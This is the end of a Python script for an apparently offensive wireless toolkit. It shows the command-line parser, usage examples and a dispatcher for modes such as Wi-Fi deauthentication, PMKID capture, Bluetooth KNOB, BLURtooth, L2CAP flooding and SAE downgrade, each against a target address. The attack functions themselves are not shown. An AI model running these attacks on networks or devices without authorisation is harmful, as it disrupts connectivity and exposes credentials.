        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 %(prog)s --mode wifi_scan
  sudo python3 %(prog)s --mode bt_scan
  sudo python3 %(prog)s --mode full_audit
  sudo python3 %(prog)s --mode deauth --target AA:BB:CC:DD:EE:FF
  sudo python3 %(prog)s --mode pmkid --target AA:BB:CC:DD:EE:FF
  sudo python3 %(prog)s --mode bt_knob --target AA:BB:CC:DD:EE:FF
  sudo python3 %(prog)s --mode bt_blur --target AA:BB:CC:DD:EE:FF
  sudo python3 %(prog)s --mode bt_flood --target AA:BB:CC:DD:EE:FF
  sudo python3 %(prog)s --mode sae_downgrade --target AA:BB:CC:DD:EE:FF
  sudo python3 %(prog)s --mode fingerprint
        """
    )
    parser.add_argument("--mode", required=True,
                        choices=["wifi_scan", "bt_scan", "full_audit",
                                 "deauth", "pmkid", "bt_knob", "bt_blur",
                                 "bt_flood", "sae_downgrade", "fingerprint"],
                        help="Attack/audit mode")
    parser.add_argument("--target", help="Target BSSID or MAC address")
    parser.add_argument("--interface", "-i", help="Wireless interface (auto-detect if not specified)")
    parser.add_argument("--count", type=int, default=50, help="Number of frames (deauth)")
    parser.add_argument("--duration", type=int, default=120, help="Capture duration in seconds")
    
    args = parser.parse_args()
    check_root()
    
    log(f"Flipper One Wireless Toolkit - Mode: {args.mode}")
    log(f"Output directory: {OUTPUT_DIR}")
    
    if args.mode == "wifi_scan":
        wifi_scan(args.interface)
    
    elif args.mode == "bt_scan":
        bt_scan()
    
    elif args.mode == "full_audit":
        full_audit()
    
    elif args.mode == "deauth":
        if not args.target:
            log("--target required for deauth mode", "ERROR")
            sys.exit(1)
        iface = args.interface or get_wifi_interface()
        deauth_attack(iface, args.target, args.count)
    
    elif args.mode == "pmkid":
        if not args.target:
            log("--target required for pmkid mode", "ERROR")
            sys.exit(1)
        iface = args.interface or get_wifi_interface()
        pmkid_capture(iface, args.target, args.duration)
    
    elif args.mode == "bt_knob":
        if not args.target:
            log("--target required for bt_knob mode", "ERROR")
            sys.exit(1)
        bt_knob_attack(args.target)
    
    elif args.mode == "bt_blur":
        if not args.target:
            log("--target required for bt_blur mode", "ERROR")
            sys.exit(1)
        bt_blur_attack(args.target)
    
    elif args.mode == "bt_flood":
        if not args.target:
            log("--target required for bt_flood mode", "ERROR")
            sys.exit(1)
        bt_l2cap_flood(args.target, args.duration)
    
    elif args.mode == "sae_downgrade":
        if not args.target:
            log("--target required for sae_downgrade mode", "ERROR")
            sys.exit(1)
        iface = args.interface or get_wifi_interface()
        sae_downgrade_check(iface, args.target)
    
    elif args.mode == "fingerprint":
        iface = args.interface or get_wifi_interface()
        wifi_fingerprint(iface)

if __name__ == "__main__":
    main()
